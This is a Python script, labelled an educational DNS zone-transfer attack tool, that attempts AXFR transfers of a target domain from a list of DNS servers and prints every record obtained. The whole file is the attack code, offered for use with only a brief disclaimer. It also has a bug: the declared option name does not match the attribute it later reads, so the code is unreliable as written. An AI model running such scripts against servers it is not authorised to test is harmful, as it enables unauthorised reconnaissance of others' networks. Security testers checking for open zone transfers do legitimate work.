###############################################################################
##                                                                            ##
##             Author: MAhmutAY   <mahmutayy@yahoo.com>                       ##
##              This is a DNS Zone Transfer attack script                     ##
##                                                                            ##
##              This is only educational purpose usage                        ##
##  !!  Do not attempt to violate the laws with anything contained here. !!!  ##
################################################################################

import dns.zone
import dns.query
import dns.exception
import argparse

def Zone_Transfer(target_dns_ip, domain):
    try:
        xfr = dns.query.xfr(target_dns_ip, domain)
        zone = dns.zone.from_xfr(xfr)
        if zone:
            for name, node in zone.nodes.items():
                print(zone[name].to_text(name))
        else:
            print(f"No zone information obtained from {target_dns_ip} for domain {domain}.")
    except dns.exception.DNSException as e:
        print(f"DNS error occurred: {e}")
    except Exception as e:
        print(f"Error occurred: {e}")

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='DNS Zone Transfer Attack Script for Educational Purposes By Mahmut Ay')
    parser.add_argument('domain', type=str, help='Domain for which to attempt zone transfer')
    parser.add_argument('--dnsServersFile ', type=str, default='dns_servers.txt', help='File containing target DNS server IPs, one per line (default: dns_servers.txt)')
    
    args = parser.parse_args()

    try:
        with open(args.dns_servers_file, 'r') as f:
            dns_servers = [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        print(f"File {args.dns_servers_file} not found.")
        exit(1)

    for dns_server in dns_servers:
        print(f"Attempting zone transfer from {dns_server} for domain {args.domain}")
        Zone_Transfer(dns_server, args.domain)
